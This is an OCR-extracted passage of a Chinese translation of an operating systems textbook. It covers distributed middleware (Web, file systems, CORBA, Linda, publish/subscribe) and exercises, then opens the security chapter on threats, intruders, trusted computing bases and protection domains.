由于Internet电子邮件地址采用“用户名@DNS 主机名”的形式命名，所以DNS名称广为人知。
该命名系统允许发送方机器上的邮件程序在DNS数据库 中查找目标机器的IP地址，并与目标机上的邮件守护进程建立TCP连接，然后把邮件作为文件发送出去。
用户名一并发送，用于确定存放消息的邮箱。
8.3.3 基于文档的中间件
现在我们已经有了一些有关网络和协议的背景知识，可以开始讨论不同的中间件层了。
这些中间件 层位于基础网络上，为应用程序和用户提供一致的范型。
我们将从一个简单但是却非常著名的例子开始： 万维网 (World Wide Web) 。
Web是由在欧洲核子中心(CERN) 工作的Tim Berners-Lee于1989年发明的， 从那以后Web 就像野火一样传遍了全世界。
图8-32 Web 是一个由文档构成的大有向图
每个Web页面都有一个唯一的地址，称为URL(统一资源定位符，Uniform Resource Locator),其 形式为protocol://DNS-name/file-name。
http 协议(超文本传输协议，HyperText Transfer Protocol)是 最 常用的，不过ftp 和其他协议也在使用。
协议名后面是拥有该文件的主机的DNS 名称。
最后是一个本地文 件名，用来说明需要使用哪个文件。
因此，URL 唯一指定一个单个文件。
2)DNS 的回答是66.147.238.215。
3)浏览器建立一个到66.147.238.215上端口80的TCP 连接。
4)接着浏览器发送对文件getting-started/index.html 的请求。
6)浏览器显示getting-started/index.html 文件中的所有内容。
7)同时，浏览器获取并显示页面中的所有图像。
8)释放TCP 连接。
8.3.4 基于文件系统的中间件
隐藏在Web 背后的基本思想是，使一个分布式系统看起来像一个巨大的、超链接的集合。
另一种处 理方式则是使一个分布式系统看起来像一个大型文件系统。
在这一节中，我们将考察一些与设计一个广 域文件系统有关的问题。
分布式系统采用一个文件系统模型意味着只存在一个全局文件系统，全世界的用户都能够读写他们 各自具有授权的文件。
通过一个进程将数据写入文件而另一个进程把数据读出的办法可以实现通信。
由 此产生了标准文件系统中的许多问题，但是也有一些与分布性相关的新问题。
1.传输模式
新文件
工作时，文件被
请求 应答
b)
图8-33 a) 上传/下载模式；b) 远程访问模式
上传/下载模式的优点是简单，而且一次性传送整个文件的方法比用小块传送文件的方法效率更高。
其缺点是为了在本地存放整个文件，必须拥有足够的空间，即使只需要文件的一部分也要移动整个文件， 这样做显然是一种浪费，而且如果有多个并发用户则会产生一致性问题。
2. 目录层次
a)
b)
c)
3. 命名透明性
328 第 8 章
1)机器+路径名，如/machine/path 或 machine:path。
2)将远程文件系统安装在本地文件层次中。
3)在所有的机器上看来都相同的单一名字空间。
前两种方式很容易实现，特别是作为将原本不是为分布式应用而设计的已有系统连接起来的方式时是这样。
而第三种方式的实现则是困难的，并且需要仔细的设计，但是它能够减轻了程序员和用户的负担。
4.文件共享的语义
当两个或多个用户共享同一个文件时，为了避免出现问题有必要精确地定义读和写的语义。
在单处 理器系统中，通常，语义是如下表述的，在一个read 系统调用跟随一个write 系统调用时，则read 返回 刚才写入的值，如图8-35a所示。
类似地，当两个write连续出现，后跟随一个read时，则读出的值是后 一个写操作所存入的值。
实际上，系统强制所有的系统调用有序，并且所有的处理器都看到同样的顺序。
我们将这种模型称为顺 序 一 致 性 (sequential consistency)。
单处理器
a)
图8-35 a) 顺序一致性；b) 在一个带有高速缓存的分布式系统中，读文件可能会返回一个废弃的值
8.3.5 基于对象的中间件
现在让我们考察第三种范型。
这里不再说一切都是文档或者一切都是文件，取而代之，我们会说一 切都是对象。
对象是变量的集合，这些变量与一套称为方法的访问过程绑定在一起。
进程不允许直接访 问这些变量。
相反，要求它们调用方法来访问。
有一些程序设计语言，如C++ 和Java, 是面向对象的，但这些对象是语言级的对象，而不是运行时 刻的对象。
一个知名的基于运行时对象的系统是CORBA (公共对象请求代理体系结构，Common
当创建一个CORBA对象时，一个对它的引用也创建出来并返回给创建它的进程。
该引用涉及进程如 何标识该对象以便随后对其方法进行调用。
该引用还可以传递给其他的进程或存储在一个对象目录中。
为了能够在CORBA 系统中使用那些不是为CORBA 编写的对象，可以为每个对象装备一个对象适配 器 (object adapter)。
对象适配器是一种包装器，它处理诸如登记对象、生成对象引用以及激发一个在 被调用时处于未活动状态的对象等琐碎事务。
所有这些与CORBA 有关部分的布局如图8-36所示。
图8-36 基于CORBA的分布式系统中的主要元素 (CORBA 部件由灰色表示)
8.3.6 基于协作的中间件
1.Linda
Linda 是一个由耶鲁大学的David Gelernter和他的学生Nick Carriero(Carriero与Gelernter,1986;
Carriero 与Gelernter,1985) 研发的用于通信和同步的新系统。
在Linda 系统中，相互独立的进程之间通过 一个抽象的元组空间(tuple space)进行通信。
对整个系统而言，元组空间是全局性的，在任何机器上的 进程都可以把元组插入或移出元组空间，而不用考虑它们是如何存放的以及存放在何处。
对于用户而言， 元组空间像一个巨大的全局共享存储器，如同我们前面已经看到的(见图8-21c) 各种类似的形式。
于C-Linda, 域的类型包括整数、长整数、浮点数以及诸如数 组(包括字符串)和结构(但是不含有其他的元组)之类的 组合类型。
与对象不同，元组是纯粹的数据；它们没有任何 相关联的方法。
在图8-37中给出了三个元组的示例。
在元组上存在四种操作。
第一种out, 将一个元组放入元 组空间中。
例如，
图8-37 三个Linda的元组
out("abc",2,5);
该操作将元组("abc",2,5)放入到元组空间中。
out的域通常是常数、变量或者是表达式，例如 out("matrix-1",i.j,3.14);
输出一个带有四个域的元组，其中的第二个域和第三个域由变量和的当前值所决定。
通过使用in原语可以从元组空间中获取元组。
该原语通过内容而不是名称或者地址寻找元组。
in 的 域可以是表达式或者形式参数。
例如，考虑
in("abc",2,?
i);
这个操作在元组空间中“查询”包含字符串“abc” 、 整数2以及在第三个域中含有任意整数(假设是整 数)的元组。
如果发现了，则将该元组从元组空间中移出，并且把第三个域的值赋予变量i。
这 种 匹 配
和移出操作是原子性的，所以，如果两个进程同时执行in操作，只有其中一个会成功，除非存在两个或 更多的匹配元组。
在元组空间中甚至可以有同一个元组的多个副本存在。
in采用的匹配算法是很直接的。
in 原语的域，称为模板 (template), (在概念上)它与元组空间中 的每个元组的同一个域相比较，如果下面的三个条件都符合，那么产生出一个匹配：
1)模板和元组有相同数量的域。
2)对应域的类型一样。
3)模板中的每个常数或者变量均与该元组域相匹配。
形式参数，由问号标识后面跟随一个变量名或类型所给定，并不参与匹配(除了类型检查例外),尽管 在成功匹配之后，那些含有一个变量名称的形式参数会被赋值。
如果没有匹配的元组存在，调用进程便被挂起，直到另一个进程插入了所需要的元组为止，此时该 调用进程自动复活并获得新的元组。
进程阻塞和自动解除阻塞意味着，如果一个进程与输出一个元组有 关而另一个进程与输入一个元组有关，那么谁在先是无关紧要的。
唯一的差别是，如果in在out 之前被调 用了，那么会有少许的延时存在，直到得到元组为止。
在某个进程需要一个不存在的元组时，阻塞该进程的方式可以有许多用途。
例如，该方式可以用于 信号量的实现。
为了要建立信号量S或在信号量S 上执行一个up 操作，进程可以执行如下操作
out("semaphore S");
要执行一个down 操作，可以进行
in("semaphore S");
在元组空间中("semaphore S")元组的数量决定了信号量S的状态。
如果信号量不存在，任何要获得信 号量的企图都会被阻塞，直到某些其他的进程提供一个为止。
除 了out 和in操 作 ，Linda 还提供了原语read, 它 和in是一样的，不过它不把元组移出元组空间。
还有 一个原语eval, 它的作用是同时对元组的参数进行计算，计算后的元组会被放进元组空间中去。
可以利 用这个机制完成一个任意的运算。
以上内容说明了怎样在Linda 中创建并行的进程。
2. 发布/订阅
由于受到Linda 的启发，出现了基于协作的模型的一个例子，称作发布/订阅 (Oki 等人，1993)。
它由大量通过广播网网络互联的进程组成。
每个进程可以是一个信息生产者、信息消费者或两者都是。
当一个信息生产者有了一条新的信息(例如， 一个新的股票价格)后，它就把该信息作为一个元组 在网络上广播。
这种行为称为发 布 (publishing) 。
在每个元组中有一个分层的主题行，其中有多个用圆 点(英文句号)分隔的域。
对特定信息感兴趣的进程可以订阅 (subscribe) 特定的专题，这包括在主题 行中使用通配符。
在同一台机器上，只要通知一个元组守护进程就可以完成订阅工作，该守护进程监测 已出版的元组并查找所需要的专题。
发布/订阅的实现过程如图8-38所示。
当一个进程需要发布一个元组时，它在本地局域网上广播。
在每 台机器上的元组守护进程则把所有的已广播的元组复制进入其RAM。
然后检查主题行看看哪些进程对它感 兴趣，并给每个感兴趣的进程发送一个该元组的副本。
元组也可以在广域网上或Internet 上进行广播，这种 做法可以通过将每个局域网中的一台机器变作信息路由器，用来收集所有已发布的元组，然后转送到其他 的局域网上再次广播的方法来实现。
这种转送方法也可以进行得更为聪明，即只把元组转送给至少有一个 需要该元组的订阅者的远程局域网。
不过要做到这一点，需要使用信息路由器交换有关订阅者的信息。
这里可以实现各种语义，包括可靠发送以及保证发送，即使出现崩溃也没有关系。
在后一种情形下， 有必要存储原有的元组供以后需要时使用。
一种存储的方法是将一个数据库系统和该系统挂钩，并让该 数据库订阅所有的元组。
这可以通过把数据库封装在一个适配器中实现，从而允许一个已有的数据库以 发布/订阅模型工作。
当元组们经过时，适配器就一一抓取它们并把它们放进数据库中。
发布/订阅模型完全把生产者和消费者分隔开来，如同在Linda中一样。
但是，有的时候还是有必要 知道，另外还有谁对某种信息感兴趣。
这种信息可以用如下的方法来收集：发布一个元组，它只询问： “谁对信息x有兴趣?
”。
以元组形式的响应会是：“我对x有兴趣。
”
图8-38 发布/订阅的体系结构
8.4 有 关 多 处 理 机 系 统 的 研 究
针对多核的研究工作中也不全是重新设计的系统。
Boyd-Wickizer 等人(2010)在尝试研究和消除 将Linux 扩展到48核机器时遇到的瓶颈。
在此过程中他们发现这一类系统如果仔细设计，也可以达到很 好的可扩展性。
Clements 等人(2013)研究了决定一个API 是否被设计为可扩展的一些基本准则。
结果 表明无论接口操作何时进行通信，都存在着一个可扩展的实现方法。
有了以上的知识，操作系统的设计 者可以实现更具扩展性的操作系统。
近些年来很多系统方面的研究关注如何使大型应用可以在多核和多处理器的环境下进行扩展。
其中 的一个例子是Salomie 等人(2011)介绍了一种可扩展的数据库引擎。
同样，他们的解决方案也是通过 复制数据库而不是隐藏硬件并行特性的方法来达到可扩展性。
调试并行应用是一件困难的事情，并且一些竞争条件很难重现。
Viennot 等人(2013)提出了一种 通过回访的机制来调试多核系统软件的方法。
Kasikci 等人(2012)提出了一种不仅能检测竞争条件而且 还能分辨竞争条件好坏的工具。
最后还有很多降低多处理器系统功耗的工作。
Chen 等人(2013)提出了利用电量容器来提供细粒 度电量和功耗管理的方法。
8.5 小结
采用多个CPU 可以把计算机系统建造得更快更可靠。
CPU 的四种组织形式是多处理器、多计算机、 虚拟机和分布式系统。
其中的每一种都有其自己的特性和问题。
一个多处理器包括两个或多个CPU, 它们共享一个公共的RAM, 通常这些CPU 本身由多核组成， 这些核和CPU 可以通过总线、交叉开关或一个多级交换网络互连起来。
各种操作系统的配置都是可能的， 包括给每个CPU 配一个各自的操作系统、配置一个主操作系统而其他是从属的操作系统或者是一个对称 多处理器，在每个CPU 上都可运行的操作系统的一个副本。
在后一种情形下，需要用锁提供同步。
当没 有可用的锁时， 一个CPU 会空转或者进行上下文切换。
各种调度算法都是可能的，包括分时、空间分割
以及群调度。
多计算机也有两个或更多的CPU, 但是这些CPU有自己的私有存储器。
它们没有任何公共的RAM, 所以全部的通信通过消息传递完成。
在有些情形下，网络接口板有自己的CPU, 此时在主CPU和接口板 上的CPU之间的通信必须仔细地组织，以避免竞争条件的出现。
在多计算机中的用户级通信常常使用远 程过程调用，但也可以使用分布式共享存储器。
这里进程的负载平衡是一个问题，有多种算法用以解决 该问题，包括发送者一驱动算法、接收者一驱动算法以及竞标算法等。
分布式系统是一个松散耦合的系统，其中每个节点是一台完整的计算机，配有全部的外部设备以及 自己的操作系统。
这些系统常常分布在较大的地理区域内。
在操作系统上通常设计有中间件，从而提供 一个统一的层次以方便与应用程序的交互。
中间件的类型包括基于文档、基于文件、基于对象以及基于 协调的中间件。
有关的一些例子有World Wide Web 、CORBA以及Linda。
习题
1. 可以把USENET新闻组系统和SETI@home项目 看作分布式系统吗?
(SETI@home 使用数百万 台空闲的个人计算机，用来分析无线电频谱数 据以搜寻地球之外的智慧生物)。
如果是，它们 属于图8-1中描述的哪些类?
2.如果一个多处理器中的三个CPU在同一时刻试 图访问内存中同一个字，会发生什么?
3.如果一个CPU在每条指令中都发出一个内存访 问请求，而且计算机的运行速度是200MIPS, 那么多少个CPU会使一个400MHz的总线饱和?
假设对内存的访问需要一个总线周期。
如果在 该系统中使用缓存技术，且缓存命中率达到 90%,又需要多少CPU?
最后，如果要使32个 CPU共享该总线而且不使其过载，需要多高的 命中率?
4.在图8-5的omega网络中，假设在交换网络2A和 交换网络3B之间的连线断了。
那么哪些节点之 间的联系被切断了?
5.在图8-7的模型中，信号是如何处理的?
6.当如图8-8所示模型的系统调用发生时，必须要 在陷入内核时立即解决一个不会在图8-7的模型 中发生的问题。
这个问题的本质是什么,应该 如何解决?
7. 使用纯read 重写图2-22中的enter_region 代码， 用以减少由TSL 指令所引起的颠簸。
9. 为了避免竞争，在SMP 操作系统代码段中的临 界区真的有必要吗，或者数据结构中的互斥信 号量也可完成这项工作吗?
10. 在多处理器同步中使用TSL指令时，如果持有 锁的CPU和请求锁的CPU都需要使用这个拥有 互斥信号量的高速缓冲块，那么这个拥有互斥 信号量的高速缓冲块就得在上述两个CPU之间 来回穿梭。
为了减少总线交通的繁忙，每隔50 个总线周期，请求锁的CPU就执行一条TSL指 令，但是持有锁的CPU在两条TSL指令之间需 要频繁地引用该拥有互斥信号量的高速缓冲 块。
如果一个高速缓冲块中有16个32位字，每 一个字都需要用一个总线周期传送，而该总线 的频率是400MHz, 那么高速缓冲块的来回移 动会占用多少总线带宽?
11. 教材中曾经建议在使用TSL 轮询锁之间使用二 进制指数补偿算法。
也建议过在轮询之间使用 最大时延。
如果没有最大时延，该算法会正确 工作吗?
12. 假设在一个多处理器的同步处理中没有TSL 指 令。
相反，提供了另一个指令SWP, 该指令 可以把一个寄存器的内容交换到内存的一个字 中。
这个指令可以用于多处理器的同步吗?
如 果可以，它应该怎样使用?
如果不行，为什么 它不行?
13.在本问题中，读者要计算把一个自旋锁放到总 线上需要花费总线的多少装载时间。
假设CPU 执行每条指令花费5纳秒。
在一条指令执行完 毕之后，不需要任何总线周期，例如，执行 TSL 指令。
每个总线周期比指令执行时间长10 纳秒甚至更多。
如果一个进程使用TSL 循环试 图进入某个临界区，它要耗费多少的总线带 宽?
假设通常的高速缓冲处理正在工作，所以
取一条循环体中的指令并不会浪费总线周期。
14.亲和调度减少了高速缓冲的失效。
它也减少 TLB的失效吗?
对于缺页异常呢?
15.对于图8-16中的每个拓扑结构，互连网络的直 径是多少?
请计算该问题的所有跳数(主机一 路由器和路由器一路由器)。
16. 考虑图8-16 d 中的双凸面拓扑，但是扩展到 k×k 。
该网络的直径是多少?
( 提 示：分别考 虑k是奇数和偶数的情况。
)
18.如果多计算机系统中的网络接口处于用户模 式，那么从源RAM到目的RAM 只需要三个副 本。
假设该网络接口卡接收或发送一个32位的 字需要20ns, 并且该网络接口卡的频率是 1Gb/s 。
如果忽略掉复制的时间，那么把一个 64字节的包从源送到目的地的延时是多少?
如 果考虑复制的时间呢?
接着考虑需要有两次额 外复制的情形，即在发送方将数据复制到内核 的时间，和在接收方将数据从内核中取出的时 间。
在这种情形下的延时是多少?
19.对于三次复制和五次复制的情形，重复前一个 问题，不过这次是计算带宽而不是计算延时。
20. 在将数据从RAM 传送到网络接口时，可以使 用钉住页面的方法，假设钉住和释放页面的系 统调用要花费1微秒时间。
使用DMA 方法复制 速度是5字节/纳秒，而使用编程I/O 方法需要 20纳秒。
一个数据包应该有多大才值得钉住页 面并使用DMA方法?
21.将一个过程从一台机器中取出并且放到另一台 机器上称为RPC, 但会出现一些问题。
在正文 中，我们指出了其中四个：指针、未知数组大 小、未知参数类型以及全局变量。
有一个未讨 论的问题是，如果(远程)过程执行一个系统 调用会怎样。
这样做会引起什么问题，应该怎 样处理?
22.在DSM 系统中，当出现一个页面故障时，必 须对所需要的页面进行定位。
请列出两种寻找 该页面的可能途径。
23. 考虑图8-24中的处理器分配。
假设进程H从节点2 被移到节点3上。
此时的外部信息流量是多少?
24.某些多计算机允许把运行着的进程从一个节点 迁移到另一个节点。
停止一个进程，冻结其内 存映像，然后就把他们转移到另一个节点上是 否足够?
请指出要使所述的方法能够工作的两 个必须解决的问题。
25.在以太网上为什么会有对电缆长度的限制?
26.在图8-27中，四台机器上的第三层和第四层标 记为中间件和应用。
在何种角度上它们是跨平 台一致的，而在何种角度上它们是跨平台有差 异的?
(a)Internet 上的视频点播。
(b) 下载一个网页。
28.DNS 的名称有一个层次结构，如sales.general- widget.com或cs.uni.edu。
维护DNS数据库的一种 途径是使用一个集中式的数据库，但是实际上 并没有这样做，其原因是每秒钟会有太多的请 求。
请提出一个实用的维护DNS数据库的建议。
29. 在讨论浏览器如何处理URL时，曾经说明与端 口80连接。
为什么?
30.虚拟机迁移可能比进程迁移容易，但是迁移仍 然是困难的。
在虚拟机迁移的过程中会产生哪 些问题?
31.当浏览器获取一个网页时，它首先发起一个 TCP 链接以获得页面上的文本(该文本用 HTML 语言写成)。
然后关闭链接并分析该页 面。
如果页面上有图形或图标，就发起不同的 TCP 链接以获取它们。
请给出两个可以改善性 能的替代建议。
32.在使用会话语义时，有一项总是成立的，即一 个文件的修改对于进行该修改的进程而言是立 即可见的，而对其他机器上的进程而言是绝对 不可见的。
不过存在一个问题，即这种修改对 同一台机器上的其他进程是否应该立即可见。
请提出正反双方的争辩意见。
33.当有多个进程需要访问数据时，基于对象的访 问在哪些方面要好于共享存储器?
35.缓存区的复制很花费时间。
写一个C 程序找出 你访问的系统中这种复制花费了多少时间。
可 使用clock 或times 函数用以确定在复制一个大 数组时所花费的时间。
请测试不同大小的数组，
以便把复制时间和系统开销时间分开。
37.写一个程序，实现8.2节中描述的发送方驱动和 接收方驱动的负载平衡算法。
这个算法必须把 新创建的作业列表作为输入，作业的描述为 (creating_processor,start_time,required_
CPU_time), 其 中creating_processor 表示创建作 业的CPU序 号 ，start_time 表示创建作业的时间， required_CPU_time表示完成作业所需要的时间 (以秒为单位)。
当节点在执行一个作业的同时 有第二个作业被创建，则认为该节点超负荷。
在重负载和轻负载的情况下分别打印算法发出 的探测消息的数目。
同时，也要打印任意主机 发送和接收的最大和最小的探针数。
为了模拟 负载，要写两个负载产生器。
第一个产生器模 拟重的负载，产生的负载为平均每隔AJL秒N个 作业，其中AJL 是作业的平均长度，N 是处理器 个数。
作业长度可能有长有短，但是平均作业 长度必须是AJL 。
作业必须随机地创建(放置) 在所有处理器上。
第二个产生器模拟轻的负载，
每AJL秒随机地产生 (N/3) 个作业。
为这两个 负载产生器调节其他的参数设置，看看是如何 影响探测消息的数目。
38.实现发布/订阅系统的最简单的方式是通过一 个集中的代理，这个代理接收发布的文章，然 后向合适的订阅者分发这些文章。
写一个多线 程的应用程序来模拟一个基于代理的发布/订 阅系统。
发布者和订阅者线程可以通过(共享) 内存与代理进行通信。
每个消息以消息长度域 开头，后面紧跟着其他字符。
发布者给代理发 布的消息中，第一行是用“. ”隔开的层次化 主题，后面一行或多行是发布的文章正文。
订 阅者给代理发布的消息，只包含着一行用“. ” 隔开的层次化的兴趣行 (interest line),表示 他们所感兴趣的文章。
兴趣行可能包含“*. ” 等通配符，代理必须返回匹配订阅者兴趣的所 有(过去的)文章，消息中的多篇文章通过 “BEGIN NEW ARTICLE” 来分隔。
订阅者必 须打印他接收到的每条消息(如他的兴趣行)。
订阅者必须连续接收任何匹配的新发布的文 章。
发布者和订阅者线程可通过终端输入 “P” 或 “S” 的方式自由创建(分别对应发布者和 订阅者),后面紧跟的是层次化的主题或兴趣 行。
然后发布者需要输入文章，在某一行中键 入“.”表示文章结束。
(这个作业也可以通过 基于TCP的进程间通信来实现)。
第9章 |
Modern Operating Systems,Fourth Edition
安 全
随着越来越多的信息存放在计算机系统中，确保信息安全就显得尤为重要。
对所有的操作系统而 言，保护此类信息不被未经许可地滥用是应考虑的主要问题。
然而，随着计算机系统的广泛使用(和随 之而来的系统缺陷),保证信息安全也变得越来越困难。
在本章中，我们将考察操作系统上的计算机安 全特性。
有关操作系统安全的话题在过去的几十年里产生了很大的变化。
直到20世纪90年代初期，几乎没 有多少家庭拥有计算机，大多数计算任务都是在公司、大学和其他一些拥有多用户计算机(从大型机 到微型计算机)的组织中完成的。
这些机器几乎都是相互隔离的，没有任何一台被连接到网络中。
在 这样的环境下，保证安全性所要做的全部工作就集中在了如何保证每个用户只能看到自己的文件。
如 果Tracy 和Camille 是同一台计算机的两个注册用户，那么“安全性”就是保证她们谁都不能读取或修 改对方的文件，除非这个文件被设为共享权限。
已开发出一些复杂的模型和机制，以保证没有哪个用 户可以获取非法权限。
有时这种安全模型和机制涉及一类用户，而非单个用户。
例如，在一台军用计算机中，所有数据都 必须被标记为“绝密”“机密”“秘密”或“公开”,而且下士不允许查看将军的目录，无论这个下士或 将军是谁，都禁止越权访问。
在过去的几十年中，这样的问题被反复地研究、报道和解决。
当时一个潜在的假设是， 一旦选定了一个模型并据此实现了安全系统，那么实现该系统的软件也是 正确的，会完全执行选定的安全策略。
通常情况下，模型和软件都非常简单，因此该假设常常是成立的。
举个例子，如果理论上不允许Tracy 查看Camille的某个文件，那么她的确无法查看。
攻击者可以通过病毒或者蠕虫，手动或者自动地执行漏洞攻击。
病毒和蠕虫的区别并不是非常明显。
大部分人认为病毒至少需要一些用户的交互才能够传播。
例如，用户需要点击一个附件才可能被感染。
而蠕虫不需要用户的交互或配合，它是自传播的。
它们的传播与用户的行为无关，也可能是用户自愿安 装了攻击者的代码。
例如，攻击者可以重打包流行但是昂贵的软件(例如游戏或者文字处理工具),并 在网上免费发布。
对于很多用户来说，免费是极为诱人的。
然而，安装免费游戏时也自动安装了额外的 功能，这些功能将计算机以及上面的所有东西都交给远方的计算机罪犯。
这种软件叫作特洛伊木马，也 是我们稍后将简要讨论的主题。
基于以上问题，本章将分为两个主要部分进行讨论。
首先详细介绍安全的现状，包括威胁和攻击 (9.1节)、安全和攻击的本质(9.2节)、不同的访问控制方法(9.3节)以及安全模型(9.4节)。
除此之外， 我们还将探讨安全中的核心方法——密码学(9.5节),以及不同的安全认证方式(9.6节)。
到目前为止，我们还没有面临什么实质威胁，然而现实并非如此。
接下来的四节将讨论实际存在的 安全问题，包括攻击者使用的控制计算机系统的技巧，以及为防止这种情况的发生而采取的应对措施。
我们还会讨论内部攻击以及各种不同的电子病毒。
最后，我们简单地讨论计算机安全相关的研究现状并 对本章进行总结。
9.1 环境安全
模型以帮助获取安全屏障。
9.1.1 威胁
很多安全方面的文章将信息系统的安全分解为三个部 分：机密性，完整性和可用性。
它们通常被称为CIA (Confidentiality,Integrity,Availability) 。
如图9-1所示，它 们构成了我们严防攻击和窃听的核心安全属性。
第一个安全属性是机密性，指的是将机密的数据置于保
图9-1 安全性的目标和威胁
密状态。
更确切地说，如果数据所有者决定这些数据仅用于特定的人，那么系统就应该保证数据绝对不 会发布给未经授权的人。
数据所有者至少应该有能力指定谁可以阅读哪些信息，而系统则对用户的选择 进行强制执行，这种执行的粒度应该精确到文件。
后来，人们认为三个基本属性不能满足所有场景，因此又增添了一些额外属性，例如真实性、可审 计性、不可否认性、隐私性以及一些其他诸如此类的属性。
显然，这些都是不错的。
但尽管如此，初始
的三个基本属性仍旧在安全专家的心中占据着特殊的地位。
有时候攻击的影响会超越计算机系统本身，对现实世界也会有影响。
其中一个例子是针对澳大利亚 昆士兰马芦奇郡(离布里斯班不远)的废弃管理系统的攻击。
一个排污系统安装公司的前雇员对马芦奇 郡议会拒绝他的工作申请心怀不满，他决定进行报复。
他掌握了污水处理系统的控制权，造成上百万升 未经处理的污水溢入公园、河流、沿岸水域(其中的鱼类迅速死亡)以及其他地方。
更为普遍的是，有些人对某些国家或种族不满，或是对世界感到愤怒，妄图摧毁尽可能多的基础设 施，而不在意破坏性和受害者。
这些人常常觉得攻击“敌人”的电脑是一件令人愉悦的事情，而并不在 意“攻击”本身。
另一个极端是网络战。
一个通常被称为“震网”病毒的网络战武器破坏了伊朗在纳坦兹的铀浓缩设 施，据说这使得伊朗的核计划显著放缓。
虽然没有人站出来声称对这次攻击事件负责，但此次事件可能 是一个或多个伊朗的敌对国家的秘密组织发动的。
安全问题的另一个与保密性相关的重要方面是隐私 (privacy), 即保证私人的信息不被滥用。
隐私 会导致许多法律和道德问题。
政府是否应该为每个人编制档案来追查罪犯(如盗窃犯或逃税犯)?
警察
安 全 339
是否可以为了制止有组织犯罪而调查任何人或任何事件?
美国国家安全机构是否可以为了抓住潜在的恐 怖分子而每天监视数百万台手机?
雇主和保险公司有权利知道个人隐私吗?
当这些特权与个人权益发生 冲突时会怎么样?
这些话题都是十分重要的，但是它们超出了本书的范围。
9.1.2 入侵者
我们中的大多数人非常善良并且守法，那么为什么要担心安全问题呢?
因为，我们周围还有少数人 并不友好，他们总是想惹麻烦(可能为了自己的商业利益)。
从安全性的角度来说，那些喜欢闯入与自 己毫不相干区域的人叫作攻击者(attacker)、入 侵 者(intruder) 或 敌 人(adversary)。
在几十年前，破 解计算机系统是为了向朋友展示你有多聪明，但是现在，这不再是破解一个系统唯一或者最主要的原因。
有很多不同类型的攻击者，他们有着不同的动机：盗窃，政治或社团目的，故意破坏，恐怖主义，网络 战，间谍活动，垃圾邮件，敲诈勒索，欺诈。
当然，偶尔攻击者仅仅是为了炫耀，或揭露一个组织的安 全性有多差。
9.2 操作系统安全
然而， 一些最重要的安全事故是由复杂的网络攻击导致的。
在本书中，我们只关注涉及操作系统 的攻击。
换句话说，我们将不会涉及网络攻击或针对SQL 数据库的攻击。
相反，我们关注的是以操作 系统为攻击目标，或是在安全策略执行中操作系统起到重要作用(或更常见的是未能起到作用)的攻 击行为。
9.2.1 可信系统
如今，报纸上总是经常能看到攻击者破解计算机系统、窃取信息或者控制数百万台计算机等类似的 故事。
天真的人可能会问下面两个问题：
1)建立一个安全的操作系统有可能吗?
2)如果可能，为什么不去做呢?
第一个问题的答案原则上是肯定的。
理论上，软件是可以避免错误的，我们甚至可以验证它是安全 的——只要软件不是过大或者过于复杂。
不幸的是，今天的计算机系统极其复杂，这与第二个问题有很 大关系。
第二个问题是，为什么不建立一个安全系统?
主要原因有两个。
首先，现代系统虽然不安全但 是用户不愿抛弃它们。
假设Microsoft 宣布除了Windows 外还有一个新的SecureOS 产品，并保证不会受到 病毒感染但不能运行Windows 应用程序，那么很少会有用户和公司把Windows 像个烫手山芋一样扔掉转
这里有两个简单的例子。
最早的电子邮件系统通过ACSII 文本发送消息。
它们非常简单并且是绝对 安全的。
除非邮件系统存在漏洞，否则几乎没有ASCII 文本可能对计算机系统造成损失(本章后面会阐 述，一些攻击手段还是可以通过此方式发动攻击的)。
然后人们想方设法扩展电子邮件的功能，引入了 其他类型的文档，如可以包含宏程序的Word 文件。
读这样的文件意味着在自己的计算机上运行别人的程 序。
无论沙盒怎么有效，在自己的计算机上运行别人的程序必定比ASCII 文本要危险得多。
是用户要求 从被动的文本改为主动的程序吗?
大概不是吧，但有人认为这是个极好的主意，而没有考虑到隐含的安 全问题。
9.2.2 可信计算基
典型的TCB 包括了大多数的硬件(除了不影响安全性的I/O 设备)、操作系统核心中的一部分、大多 数或所有掌握超级用户权限的用户程序(如UNIX中 的SETUID 根程序)等。
必须包含在TCB中的操作系 统功能有：进程创建、进程切换、内存面管理以及部分的文件和I/O 管理。
在安全设计中，为了减少空 间以及纠正错误，TCB 通常完全独立于操作系统的其他部分。
TCB中的一个重要组成部分是访问监视器，如图9-2所示。
访问监视器接受所有与安全有关的系统 请求(如打开文件等),然后决定是否允许运行。
访问监视器要求所有的安全问题决策都必须在同一处 考虑，而不能跳过。
大多数的操作系统并不是这样设计的，这也是它们导致不安全的部分原因。
用户进程
用户空间
所有系统调用通过访问 监视器进行安全检查
访问监视器 可信计算基准 操作系统内核
图9-2 访问监视器
现今安全研究的一个目标是将可信计算基中数百万行的代码缩短为只有数万行代码。
在图1-26中我 们看到了MINIX 3操作系统的结构。
MINIX 3是与POSIX兼容的系统，但又与Linux或FreeBSD 有着完全 不同的结构。
在MINIX 3中，只有10000行左右的代码在内核中运行。
其余部分作为用户进程运行。
其 中，如文件系统和进程管理器是可信计算基的一部分，因为它们与系统安全息息相关；但是诸如打印机 驱动和音频驱动这样的程序并不作为可信计算基的一部分，因为不管这些程序出了什么问题，它们的行 为也不可能危及系统安全。
MINIX 3将可信计算基的代码量减少了两个数量级，从而潜在地比传统系统 设计有更高的安全性。
9.3 保护机制
如果有一个清晰的模型来制定哪些事情是允许做的，以及系统的哪些资源需要保护，那么实现系统 安全将会简单得多。
安全方面的研究已有很多成果，这里我们也只是浅尝辄止。
我们将着重论述几个有 普遍性的模型，以及增强它们的机制。
9.3.1 保护域
计算机系统里有许多需要保护的“对象”。
这些对象可以是硬件(如CPU、内存页、磁盘驱动器或 打印机)或软件(如进程、文件、数据库或信号量)。
每一个对象都有用于调用的单一名称和允许进程运行的有限的一系列操作。
read 和write 是相对文 件而言的操作；up 和down 是相对信号量而言的操作。
显而易见的是，我们需要一种方法来禁止进程对某些未经授权的对象进行访问。
而且这样的机制必 须也可以在需要的时候使得受到限制的进程执行某些合法的操作子集。
如进程A可以对文件F有读的权 限，但没有写的权限。
为了讨论不同的保护机制，很有必要介绍一下域的概念。
域(domain) 是(对象，权限)对的集合。
每一对组合指定一个对象和一些可在其上运行的操作子集。
这里权限(right) 是指对某个操作的执行许可。
通常域相当于单个用户，告诉用户可以做什么不可以做什么,当然有时域的范围比用户要更广。
例如， 一组为某个项目编写代码的人员可能都属于相同的一个域，以便于他们都有权读写与该项目相关的文件。
对象如何分配给域由需求来确定。
一个最 基本的原则就是最低权限原则 (Principle of Least Authority,POLA),一般而言，当每个域 都拥有最少数量的对象和满足其完成工作所需的 最低权限时，安全性将达到最好。
图9-3给出了3种域，每一个域里都有一些对 象，每一个对象都有些不同的权限(读、写、执 行)。
